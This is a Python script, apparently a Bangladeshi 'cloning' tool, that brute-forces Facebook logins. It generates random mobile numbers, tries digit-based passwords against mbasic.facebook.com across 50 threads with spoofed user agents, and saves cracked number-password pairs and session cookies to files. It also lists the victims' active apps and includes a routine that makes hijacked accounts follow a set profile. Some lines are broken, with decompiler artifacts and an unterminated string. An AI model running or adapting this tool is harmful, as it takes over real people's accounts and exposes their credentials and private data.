#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')   
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text                       
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
xr = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
  
  
  \x1b[38;5;196m{𝗦} ███████╗██╗   ██╗ ██████╗██╗  ██╗\x1b[38;5;196m{𝗜} 
\033[38;5;46m{𝗨}██╔════╝██║   ██║██╔════╝██║ ██╔╝\3[38;5;46m{𝗟} 
\033[37;1m{𝗗}█████╗  ██║   ██║██║     █████╔╝ \033[37;1m{𝗢} 
\033[33;1m{𝗜}██╔══╝  ██║   ██║██║     ██╔═██╗ \033[33;1m{𝗩} 
\033[34;1m{𝗣}██║     ╚██████╔╝╚██████╗██║  ██╗\033[34;1m{𝗘} 
\033[35;1m{𝗧𝗢}╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝\033[35;1m{𝗬𝗢𝗨}
                                 
  
  
  
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝙀𝙈𝙍𝘼𝙉
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46m𝗦𝗨𝗗𝗜𝗣𝗬𝗢
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m0192645****
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m𝗜 𝗟𝗢𝗩𝗘 𝗬𝗢𝗨 𝗕𝗔𝗕𝗕𝗬
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗡𝗢
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1m𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽
\033[34;1m✮⃝ 𝗦𝗨𝗗𝗜𝗣𝗧𝗢𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗦𝗜""")
def linex():
	print('\033[38;5;49m════════════════════════════════')
loop = 0
oks = []
cps = []
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========  
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========
ugen2=[]
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
#========𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝘿𝙀𝙔 𝙉𝙊𝙊𝘽==========  
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :Sudipto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :Sudipto = '√ 2009'
        elif uid[:8] in ['10000000']        :Sudipto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Sudipto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Sudipto = ' 2010'
        elif uid[:6] in ['100001']          :Sudipto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :Sudipto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :Sudipto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :Sudipto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :Sudipto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :Sudipto = '√ 2015'
        elif uid[:5] in ['10001']           :Sudipto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :Sudipto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :Sudipto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :Sudipto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :Sudipto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:Sudipto = '√ 2021'
        elif uid[:5] in ['10008']           :Sudipto = '√ 2022'
        elif uid[:5] in ['10009']           :Sudipto = '√ 2023'
        else:Sudipto=''
    elif len(uid) in [9,10]:
        Sudipto = ' √ 2008/2009'
    elif len(uid)==8:
        Sudipto = '√ 2007/2008'
    elif len(uid)==7:
        Sudipto = '√ 2006/2007'
    else:Sudipto=''
    return Sudipto
    
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[38;5;49m════════════════════════════════')
    print(f' \033[38;5;50m𝙎𝙄𝙈𝙀:𝘾𝙊𝘿𝙀 𝙁𝙐𝘾𝙆:{xr}𝟬𝟭𝟵/𝟬𝟭𝟳/𝟬𝟭𝟴/𝟵𝟮??𝟬𝟮/𝟵𝟮𝟯𝟬𝟭/𝟵𝟭𝟳𝟴𝟴{x}')
    print('\033[38;5;49m════════════════════════════════')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' 𝙎𝙄𝙈𝙀 𝘾𝙊𝘿𝙀: ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[38;5;50m𝙇𝙄𝙈𝙄𝙏 :𝟮𝟬𝟬𝟬/𝟯𝟬𝟬𝟬/𝟱𝟬𝟬𝟬\033[38;5;49m𝙇𝙄𝙈𝙄𝙏: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    Sudipto = []
    print("")
    for bilal in range(passx):
        pww = input(f"033[38;5;50m𝙀𝙉𝙏𝙀𝙍 𝙋𝘼𝙎𝙎{bilal+1} : ")
        Sudipto.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[38;5;49m════════════════════════════════')
        print(f' \033[38;5;50m𝙏𝙊𝙏𝘼𝙇 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿: {xr}'+tl)
        print(f'{x} \033[38;5;50m𝙒𝙊𝙍𝙆 𝙊𝙁 𝙁𝙐𝘾𝙆')
        print(f' \033[38;5;50m𝙎𝙐𝘿𝙄𝙋𝙏𝙊 𝙉𝙊𝙊𝘽')
        print(f' \033[38;5;50m𝙉𝙊 𝙇𝙊𝙑𝙀 𝙐𝙈𝙈𝘼)
        print(f' \033[38;5;50m𝙉𝙀𝙏𝙒𝙊𝙍𝙆 𝙒𝙊𝙍𝙆 89𝙂 3𝙂 4𝙂 5𝙂')
        print('\033[38;5;49m════════════════════════════════')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in Sudipto:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[38;5;49m════════════════════════════════')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝘕𝘖𝘖𝘉 𝗦𝗬𝗦𝗧𝗔𝗠➻➲🖕🖕       
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text 
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                #_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝐈𝐃-------➲🤑🤑       
                print(f"""
\033[33;1m𝗦𝗨𝗗𝗜𝗣𝗧𝗢 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻🖕\033[38;5;46m𝙽𝚄𝙼𝙱𝙴𝚁╔══➻💋\033[38;5;46m{uid} 
\033[33;1m𝗡𝗢𝗢𝗕💚𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻🖕\033[38;5;46m𝖯𝖠𝖲𝖲╚══➻💋\033[38;5;46m{ps}
\033[33;1m𝗦𝗨𝗗𝗜𝗣𝗧𝗢 𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✅)\033[38;5;46m{coki}
""")
                cek_apk(session,coki)
                open('/sdcard/𝗙𝗨𝗖𝗞-𝗟𝗢𝗩𝗥-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]                
                open('/sdcard/𝗙𝗨𝗖𝗞-𝗬𝗢𝗨-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['Sudipto NOOB','Sudipto NOOB ','Sudipto CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🖕','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🖕','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}Sudipto❤️‍🔥🎁NOOB🥰\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}𝑫𝑨𝑹𝑲-𝑾𝑬𝑩𝟎𝟎𝟕 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
